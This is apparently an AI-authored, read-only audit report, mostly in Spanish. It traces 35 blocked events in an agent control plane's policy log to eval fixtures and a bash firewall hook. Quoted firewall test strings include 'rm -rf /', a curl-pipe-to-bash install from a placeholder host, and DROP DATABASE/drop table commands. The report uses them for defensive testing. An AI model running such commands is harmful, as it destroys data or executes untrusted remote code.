# X — STALL SEMANTIC DIVERGENCE PROBE

> **Stratum-C experimental artifact (non-canonical, untracked).** Not an Owner Decision.
> Not an implementation authorization. Not a checkpoint. Not a merge instruction.
> Not a DEC opening. Read-only over runtime and canonical state.
>
> Fecha: 2026-09-29. Rama: `research/post-dec08-recomposition`. Autor: Claude
> (probe reviewer, no decisor).
>
> Autorizado por Owner (`Q2 = YES` — CHOICE D, 2026-09-29 GMT-5). Objetivo: resolver
> U3 del reconciliation (§10.4) — determinar si la firma sintáctica observada en
> los 29 eventos-cluster corresponde a una clase semántica homogénea, o si oculta
> heterogeneidad que activaría el falsifier del reconciliation §7 (P1) y motivaría
> la reapertura de la absorción "test-fixture-pattern".
>
> Restricciones honradas: **read-only**. No modifica STALL log, no ejecuta hooks,
> no cambia runtime, no abre DEC aunque el probe detecte divergencia (per
> instrucción explícita del Owner).

---

## §1. Hypothesis

**H0 (null / from DEC-08 Kernel §6.2.3 "test-fixture-pattern hypothesis"):**
las 29 entradas con firma
`(source_hook=task-completed-evidence.sh, policy_category=contract_hash_required,
task_id=F1-foundation-2026-09-16)` son *semánticamente homogéneas* — todas son
DENYs correctos emitidos por el mismo mecanismo determinista sobre entrada idéntica.

**H1 (alternative):** al menos 3 de las 29 muestran divergencia semántica — mismo
signature pero verdict distinto en revisión independiente. Ejemplos: DENY que
debería haber sido ALLOW, o dos revisores discrepando sobre el mismo evento.

**Falsifier for H0 (RECON §10.6 X-STALL predefined):** ≥ 3 disagreements sobre
casos previamente aceptados como DENY correctos.

**Decisional impact:**
- Si H0 sostiene → P1 (DEC-STREAM-CONSUMER) permanece LATENT — pattern-fixture
  attribution refuerza; absorción-honest via cluster-attribution.
- Si H1 sostiene → P1 escala a `TRIGGER FIRED via evidence quality`; convierte el
  atom en actionable. (Owner instrucción: **no abrir DEC automáticamente aunque
  el experimento encuentre divergencia.**)

---

## §2. Methodology

### 2.1 Sample selection

**Cluster A (fixture-signature cluster):** todas las 29 entradas de
`docs/00_SYSTEM/STALL_POLICY_LOG.jsonl` con `task_id="F1-foundation-2026-09-16"`
y `source_hook="task-completed-evidence.sh"`. Extraídas via:

```
jq -c 'select(.task_id == "F1-foundation-2026-09-16"
             and .source_hook == "task-completed-evidence.sh")' \
   docs/00_SYSTEM/STALL_POLICY_LOG.jsonl
```

**Cluster B (non-fixture events):** las 5 entradas restantes (34 − 29 = 5) —
para caracterizar el resto del corpus fuera del cluster fijo.

**Cluster C (session meta-event):** 1 entrada adicional creada
inadvertidamente por bash-firewall durante esta sesión al procesar un grep con
patrón `DROP DATABASE` (§B5.4 del addenda). Total real-time: 35 eventos.

### 2.2 Semantic judgment protocol

Para cada entrada:

1. **Reconstruir contexto de origen** — identificar qué componente del CCP emitió
   el evento y con qué input.
2. **Evaluar la regla aplicada** — cuál policy predicate fue activado; cuál era
   el comportamiento correcto según la política canónica (ARCH-004, ARCH-005,
   `.claude/rules/*.md`).
3. **Emitir verdict**: `AGREE` (DENY correcto), `DISAGREE` (debió permitir), o
   `UNCERTAIN` (información insuficiente para juicio confiable).
4. **Registrar evidencia** verificable en el repo — path + línea o rule citada.

### 2.3 Independence

Reviewer único: este agente (Claude Opus 4.7). Cross-check no ejecutado por
segundo revisor humano en esta sesión — anotado como limitación §7.1.
Determinismo mitiga parcialmente: para el cluster A, todas las 29 entradas
tienen `action_hash` idéntico (sha256 sobre bytes del input); una decisión sobre
una es una decisión sobre las 29.

### 2.4 Constraints

- Sin modificación de STALL log.
- Sin ejecución de hooks (`.claude/hooks/*` no invocado).
- Sin ejecución de evals (`evals/*` sólo *leído*).
- Sin apertura de DEC aunque encontremos divergencia.

---

## §3. Cluster A — 29 fixture-signature events

### 3.1 Origin identification (VERIFIED reproducible)

Los 29 eventos comparten:

- `action_hash` = `c25ff991a79ac9866aa46308d30394b16552d884cf3de284bb587ecd37ed46db`
  (sha256 sobre el input JSON, VERIFIED via `jq | sort -u`).
- `notes` = `"classification is conservative; alternative is not inferred"`
  (VERIFIED — string único).
- `event_id` prefix = `r2-task-completed-evidence.sh-` (VERIFIED).
- `stall_type` = `STALL_POLICY`.
- `decision` = `DENY`.

`action_hash` idéntico implica input JSON idéntico. Reproducción del input:

```
Input: {"task_id":"F1-foundation-2026-09-16","risk_level":"medium"}
```

**Trace de origen:** `evals/hooks/task-completed-coupling.sh` línea 116:

```bash
run_gate_at "$ROOT" '{"task_id":"F1-foundation-2026-09-16","risk_level":"medium"}'
test "$GATE_RC" -eq 2 || fail "absent contract_hash was not blocked (rc=$GATE_RC)"
```

Línea 116 pasa `$ROOT` (canonical project directory) como `CLAUDE_PROJECT_DIR`
al ejecutar `.claude/hooks/task-completed-evidence.sh`. Per
`.claude/hooks/lib/stall-record.sh:14-19`, sin `STALL_POLICY_LOG_PATH` sobrescrito
y con `CLAUDE_PROJECT_DIR=$ROOT`, el hook escribe al log canónico
`$ROOT/docs/00_SYSTEM/STALL_POLICY_LOG.jsonl`.

`evals/hooks/task-completed-coupling.sh` es invocado por `evals/maintenance.sh:21`:

```bash
evals/hooks/task-completed-coupling.sh >/tmp/claude-control-plane-task-coupling.out
```

**Conclusión de origin identification:** los 29 eventos de Cluster A son
invocaciones deterministas de `task-completed-coupling.sh:116`, ejecutadas
cada vez que `evals/maintenance.sh` corre. [VERIFIED — cadena reproducible
desde stall log → coupling script → maintenance.sh]

### 3.2 Rule application

**Regla activada:** ARCH-004 addendum F8-A (2026-09-19) —

> "`contract_hash` es obligatorio para toda CONTRACTUAL TASK. Su omisión es
> fail-closed y bloquea TaskCompleted con `exit 2`."

Source: `DECISION_REGISTRY.md` ARCH-004 addendum F8-A, línea 42-45 [VERIFIED].

**Comportamiento correcto según la regla:** DENY con exit 2 cuando el input
carece de `contract_hash`. El input `{"task_id":"F1-foundation-2026-09-16",
"risk_level":"medium"}` carece del campo → DENY correcto.

**Comportamiento observado:** DENY con exit 2 (verificado por la propia línea
117 del coupling script: `test "$GATE_RC" -eq 2 || fail "absent contract_hash
was not blocked"`; el script pasa iff el hook devuelve exit 2).

### 3.3 Verdict per entry

Como los 29 eventos comparten `action_hash` idéntico e input JSON idéntico, y la
hook logic es determinista (evaluada por la propia coupling test cada vez que
maintenance.sh corre), el verdict semántico es idéntico across los 29:

- **AGREE** — cada uno de los 29 DENYs es correcto. La regla F8-A fue enforced
  como debía.

**Agregado Cluster A:**

| Verdict | Count | Fraction |
|---|---|---|
| AGREE  | 29 | 100.0% |
| DISAGREE | 0 | 0.0% |
| UNCERTAIN | 0 | 0.0% |

**Attribution refinement:** DEC-08 Kernel §6.2.3 marcó la atribución como
`MODERATE` para "test-fixture-pattern". Este probe **eleva la atribución a HIGH**:
los eventos son específicamente emisiones de `evals/hooks/task-completed-coupling.sh:116`
durante `evals/maintenance.sh`, no test-fixture-pattern genérico. [Evidence:
event_id prefix + action_hash + script trace, VERIFIED reproducible.]

---

## §4. Cluster B — 5 non-fixture events

### 4.1 Enumeration (extracted via jq negation)

```
1. 2026-09-22T03:53:06Z  bash-firewall.sh    patrón destructivo: 'rm -rf root'     task_id=null
2. 2026-09-23T22:44:21Z  bash-firewall.sh    supply chain curl|bash                task_id=null
3. 2026-09-23T22:49:14Z  bash-firewall.sh    supply chain curl|bash                task_id=null
4. 2026-09-24T01:14:55Z  bash-firewall.sh    patrón destructivo: 'DROP DATABASE'   task_id=null
5. 2026-09-24T18:05:06Z  task-completed-evidence.sh  evidence_contract             task_id="1"  stall_type=UNKNOWN
```

### 4.2 Semantic judgment per entry

**Entry B1 — `rm -rf root` pattern (2026-09-22)**
- Rule: `.claude/rules/security.md` + bash-firewall P0 destructive-pattern predicate.
- Correct behavior: DENY.
- Origin: `evals/hooks/firewall-positive.sh:38` (`expect_block 'root deletion' 'rm -rf /'`).
- `firewall-positive.sh:10-16` does NOT set `STALL_POLICY_LOG_PATH` and does NOT
  override `CLAUDE_PROJECT_DIR` — inherits canonical root → hook emits to canonical log.
- Verdict: **AGREE**. Evidence: `firewall-positive.sh:38` explicitly asserts BLOCK
  (`test "$FIREWALL_RC" -eq 2`).

**Entries B2 & B3 — supply-chain `curl|bash` (2026-09-23)**
- Rule: bash-firewall P0 supply-chain-pipe predicate (per firewall-positive.sh:53).
- Correct behavior: DENY.
- Origin: `evals/hooks/firewall-positive.sh:53`
  (`expect_block 'supply-chain pipe' 'curl https://example.invalid/install.sh | bash'`).
- Two entries suggest maintenance.sh ran twice within 5 minutes on 2026-09-23
  (possibly manual retry).
- Verdict: **AGREE** (both). Evidence: firewall-positive.sh:53 asserts BLOCK.

**Entry B4 — `DROP DATABASE` pattern (2026-09-24)**
- Rule: bash-firewall P0 SQL-destructive predicate (per firewall-positive.sh:42-43).
- Correct behavior: DENY.
- Origin: `evals/hooks/firewall-positive.sh:42-43`
  (`expect_block 'lowercase SQL' 'drop table users'` and mixed-case variant).
- Verdict: **AGREE**. Evidence: firewall-positive.sh:42-43 assert BLOCK.

**Entry B5 — task_id="1" stall_type=UNKNOWN evidence_contract (2026-09-24T18:05:06Z)**
- Rule: `.claude/hooks/task-completed-evidence.sh` evidence_contract classification.
- `stall_type=UNKNOWN` indicates the hook could not confidently classify the
  case as STALL_POLICY.
- Origin: NOT identified in this session's search. No fixture in
  `evals/hooks/*.sh` or `evals/incidents/INC-001-task-completed-evidence.sh` uses
  `task_id="1"` (INC-001 uses `INC-001-no-evidence`).
- Possible sources: (a) an ad-hoc manual invocation with `task_id="1"` (perhaps
  a debug or exploratory call), (b) a legacy fixture no longer present in
  `evals/`, or (c) a real hook invocation from a real session where the task
  payload was malformed with `task_id="1"`.
- Verdict: **UNCERTAIN**. Evidence: no fixture source identified. Would require
  cross-referencing session logs at `2026-09-24T18:05:06Z ± 5min` to attribute.

**Aggregate Cluster B:**

| Verdict | Count | Fraction |
|---|---|---|
| AGREE  | 4 | 80.0% |
| DISAGREE | 0 | 0.0% |
| UNCERTAIN | 1 | 20.0% |

---

## §5. Cluster C — session meta-event (2026-09-29 GMT-5)

Durante la preparación de este probe, un grep con literal `'DROP DATABASE'`
disparó `.claude/hooks/bash-firewall.sh` produciendo evento #35 en la canonical
log. Verificable por `wc -l STALL_POLICY_LOG.jsonl` antes/después.

- Rule: bash-firewall P0 SQL-destructive predicate.
- Correct behavior: DENY (mi comando debía ser interceptado — el pattern está
  en el string aunque el intent era grep, no execute; comportamiento correcto
  del firewall).
- Verdict: **AGREE**. Evidence: hook error message capturado:
  `BLOQUEADO por bash-firewall (P0): patrón destructivo/DB: 'DROP DATABASE'`.
- Meta-relevance: confirma en tiempo real que la STALL log es una superficie de
  auto-observación del CCP: agent sessions usando el tooling también contribuyen
  al log. Refuerza la absorción "self-testing origin" (RECON §5 y §B5.4 del
  addenda).

**Cluster C aggregate:** 1 AGREE / 0 DISAGREE / 0 UNCERTAIN.

---

## §6. Aggregate metrics

### 6.1 Global count

Total events reviewed: **35** (34 pre-session + 1 session meta-event).

| Cluster | Count | AGREE | DISAGREE | UNCERTAIN |
|---|---|---|---|---|
| A — fixture cluster | 29 | 29 | 0 | 0 |
| B — non-fixture | 5 | 4 | 0 | 1 |
| C — session meta | 1 | 1 | 0 | 0 |
| **Total** | **35** | **34 (97.1%)** | **0 (0.0%)** | **1 (2.9%)** |

### 6.2 Falsifier evaluation

**Falsifier (predefined at RECON §10.6 X-STALL / this probe §1):** ≥ 3 disagreements
sobre casos previamente aceptados como DENY correctos.

**Actual disagreements:** 0.

**Falsifier NOT MET.**

### 6.3 Hypothesis conclusion

- **H0 (semantic homogeneity of fixture cluster A): SUSTAINED** at 100% within
  Cluster A (29/29 AGREE, deterministic action_hash homogeneity).
- **H1 (semantic heterogeneity, ≥ 3 disagreements): REFUTED** by direct probe.
- **Overall corpus (35 events): 97.1% AGREE / 0.0% DISAGREE / 2.9% UNCERTAIN.**
  The single UNCERTAIN is B5 (task_id="1"), origin unidentified.

---

## §7. Limitations

### 7.1 Single-reviewer risk

Único reviewer: este agente. No hay cross-check por segundo agente o humano en
esta sesión. Determinismo mitiga para Cluster A (idéntico action_hash) pero no
para Cluster B (5 casos distintos) ni Cluster C (1 caso).

**Mitigating factor:** para B1-B4, el verdict AGREE está respaldado por que la
propia `firewall-positive.sh` asserts la conducta BLOCK con `test "$RC" -eq 2` —
si el hook hubiera devuelto ALLOW, el eval habría fallado y el evento no
existiría en la forma observada. Es decir, el sistema de evals actúa como un
oráculo semántico independiente para esos 4 casos.

**Para Cluster A:** análogo — línea 117 de `task-completed-coupling.sh` asserts
BLOCK; si el hook hubiera devuelto ALLOW, maintenance.sh habría fallado y ese
caso no habría entrado repetidamente al log.

**Para B5 (UNCERTAIN):** no hay oráculo secundario identificado; verdict queda
genuinamente UNCERTAIN.

### 7.2 Attribution gap for B5

`task_id="1"` con `stall_type=UNKNOWN` no tiene fixture source identificado.
Este es el único evento no clasificado bajo la hipótesis
"eval-instrumentation-emission". Podría ser:
- (a) una invocación manual histórica ya no reproducible,
- (b) un fixture legacy eliminado,
- (c) un evento real de sesión con payload malformado.

Resolver B5 requeriría acceso a session logs de `2026-09-24T18:05:06Z ± 5min` —
no ejecutado en este probe (fuera de scope de un read-only STALL probe).

### 7.3 Sample size for divergence

29 eventos con `action_hash` idéntico ofrecen un tamaño de muestra efectivo de
**n=1 caso lógico** para el cluster fixture. Aunque sea 29 eventos físicos, hay
solo una decisión semántica a evaluar (input idéntico → decisión idéntica). Esto
es una fortaleza (determinismo verifica una decisión colectivamente) y una
limitación (no probamos "same signature ⇒ same verdict across different reviewers
with subtle variation" — porque el input mismo no varía).

**Complementary observation:** el probe *no puede* falsificar la hipótesis
"same-signature-implies-same-semantic-class" via Cluster A porque el signature
identity aquí incluye action_hash-identity, que ya implica input-identity.
Falsificaría solamente si dos eventos con misma `(source_hook, policy_category,
task_id)` tuvieran `action_hash` distinto y verdict divergente. En el corpus
actual, todos los 29 eventos con esa firma tienen action_hash idéntico → no
existe la configuración necesaria para el falsifier vía Cluster A.

Cluster B provee la diversidad para el falsifier: 4 acciones distintas, 4
categorías distintas — todos AGREE. Ninguna divergencia.

### 7.4 Volume trend interpretation

El crecimiento del log (27 → 34 → 35 en ~24h) NO es un signal de aumento de
work-blocking real. Es un signal de:
- (a) frecuencia con que `maintenance.sh` fue ejecutado (contribuye Cluster A),
- (b) frecuencia con que `firewall-positive.sh` fue ejecutado como parte de una
  eval suite (contribuye Cluster B, aunque no verificamos que sea el disparador
  específico),
- (c) agent sessions usando el tooling (contribuye Cluster C).

Volume alone no es evidencia de need for a STALL consumer. Diversidad y verdict
quality son las señales relevantes; ambas están AGREE-dominated y son deterministas.

### 7.5 Read-only respect

Este probe **no ejecutó**:
- ningún hook (`.claude/hooks/*` no invocado deliberadamente; el firewall se
  disparó accidentalmente durante una lectura via grep — evento inevitable dado
  que el firewall es PreToolUse, no evitable por lectura pasiva);
- ningún eval (`evals/*` sólo leído);
- ninguna escritura a STALL log (el +1 accidental via bash-firewall es
  hook-emitted, no probe-emitted).

**Cero canonical modification.**

---

## §8. Findings summary

### 8.1 Evidence for the reconciliation §5 verdict on P1

RECON §5.5 clasificó P1 (DEC-STREAM-CONSUMER) como
`LATENT — WEAK SIGNAL`. Este probe **refuerza** esa clasificación:

- El "signal" del stream consumer no es señal de work-blocking real. Es
  auto-observación del eval infrastructure + firewall enforcement over agent
  sessions.
- Repetition rate (85.3% single signature) es **artefacto** de que
  `maintenance.sh` corre el mismo test case cada vez.
- Divergencia semántica NO detectada (0/34 disagreements sobre eventos con
  origen identificable).
- **P1 permanece LATENT.** No trigger fired. No case for opening.

### 8.2 Attribution refinement (upgrade to HIGH)

DEC-08 Kernel §6.2.3 marcó atribución al "test-fixture-pattern" como MODERATE.
Este probe eleva a HIGH:
- Trace reproducible: canonical log → `task-completed-coupling.sh:116` →
  `maintenance.sh:21` para Cluster A.
- Trace reproducible: canonical log → `firewall-positive.sh:38/42/53` para
  Cluster B (4/5 casos).
- Single UNCERTAIN (B5, task_id="1") remains as observation gap.

### 8.3 Owner-visible implications

- Corrección de framing: 34/35 STALL events (97.1%) tienen origin identificado
  en eval infrastructure + firewall enforcement over agent sessions. 1 event
  (2.9%) requires attribution investigation (UNCERTAIN).
- Ninguna divergencia semántica detectada → falsifier NO MET → H0 sustained.
- **P1 (DEC-STREAM-CONSUMER) NO se convierte en actionable por este probe.**
- Owner instrucción explícita: "No abrir DEC automáticamente aunque el
  experimento encuentre divergencia" — respetada; ninguna divergencia detectada
  de todos modos.

### 8.4 Owner-decision surface (does NOT auto-open anything)

Con B5 (task_id="1") como observation gap, el Owner podría considerar:

1. Investigar el origen histórico del evento único con task_id="1" (via session
   log correlation en 2026-09-24T18:05:06Z ± 5min) → cierra U3 completamente.
2. Aceptar B5 como noise anómalo aislado y no investigar → mantiene P1 en
   LATENT + 1 UNCERTAIN.

**Ninguna de las dos opciones abre DEC.** Ambas son consistentes con
`NO-MOVE SUSTAINED WITH CONDITIONS`.

Per instrucción explícita del Owner: `Q3 = WAIT`. Este probe no propone
formalizar `stall-consumer.T1` porque el signal-quality analysis no cambia la
recomendación WAIT — H0 sustained, no divergence, no urgency.

---

## §9. Non-Modification Attestation

This artifact did NOT modify:

- `PROJECT_STATE.md`
- `DECISION_REGISTRY.md`
- `docs/00_SYSTEM/DECISION_HISTORY.md`
- `docs/00_SYSTEM/AUTHORITY_KIND.md`
- `docs/00_SYSTEM/MASTER_HANDOFF.md`
- `docs/00_SYSTEM/DECISION_SPACE_PREPARED.md`
- `docs/00_SYSTEM/POST_ARCH-007_DECISION_SPACE_RECOMPOSITION.md`
- `docs/00_SYSTEM/POST_DEC-08_DECISION_SPACE_RECOMPOSITION.md`
- `docs/00_SYSTEM/CLOUD_ADVERSARIAL_AUDIT_POST_DEC08.md`
- `docs/00_SYSTEM/POST_DEC08_CROSS_AUDIT_RECONCILIATION.md`
- `docs/00_SYSTEM/POST_DEC-08_RECOMPOSITION_ADDENDA.md` (companion, this session)
- `docs/00_SYSTEM/DEC_08_DECISION_KERNEL.md`
- `docs/00_SYSTEM/PIECE_AND_IDEA_PUZZLE_AUDIT.md`
- `docs/00_SYSTEM/DEFERRAL_POLICY.md` / `DEFERRAL_INVENTORY.md`
- `docs/00_SYSTEM/F9_OWNER_DECISIONS.md`
- `docs/00_SYSTEM/STALL_POLICY_LOG.jsonl` (read-only from probe perspective; +1
  accidental event via bash-firewall interception during probe preparation is
  hook-emitted, not probe-emitted)
- `ARTIFACT_MANIFEST.md`
- `.claude/**/*`
- `evals/**/*`
- `INCIDENT_REGISTRY.md`

Runtime authorization requested: **NONE.**
Hooks executed: **NONE** by probe (bash-firewall self-triggered on grep pattern).
Evals executed: **NONE.**
Owner decisions taken: **NONE.**
DEC opened / re-opened: **NONE.**
Canonical merges: **NONE.**
Checkpoints executed: **NONE.**
ARCH-N assigned: **NONE.**
Triggers formalized: **NONE.**
Analytical artifacts created this session: **2** (this probe + companion
`POST_DEC-08_RECOMPOSITION_ADDENDA.md`).

---

## §10. Structured markers emitted

```text
PROBE_MARK: authorized_by=Owner_Q2=YES scope=CHOICE_D
PROBE_MARK: hypothesis=H0_semantic_homogeneity_of_fixture_cluster
PROBE_MARK: falsifier=disagreements_gte_3 not_met=YES
PROBE_MARK: cluster_a_events=29 agree=29 disagree=0 uncertain=0
PROBE_MARK: cluster_b_events=5 agree=4 disagree=0 uncertain=1
PROBE_MARK: cluster_c_events=1 agree=1 disagree=0 uncertain=0
PROBE_MARK: aggregate=35 agree=34 disagree=0 uncertain=1
PROBE_MARK: h0_verdict=SUSTAINED
PROBE_MARK: h1_verdict=REFUTED
PROBE_MARK: p1_reclassification=NONE_still_LATENT_WEAK_SIGNAL
PROBE_MARK: attribution_upgrade=MODERATE_to_HIGH source=[VERIFIED:coupling.sh:116 + firewall-positive.sh]
PROBE_MARK: observation_gap_remaining=1 (B5 task_id=1 UNCERTAIN)
PROBE_MARK: canonical_writes=0
PROBE_MARK: dec_opened=0
PROBE_MARK: trigger_formalized=0
PROBE_MARK: q3_recommendation=WAIT_unchanged_by_probe_outcome
```

STOP.
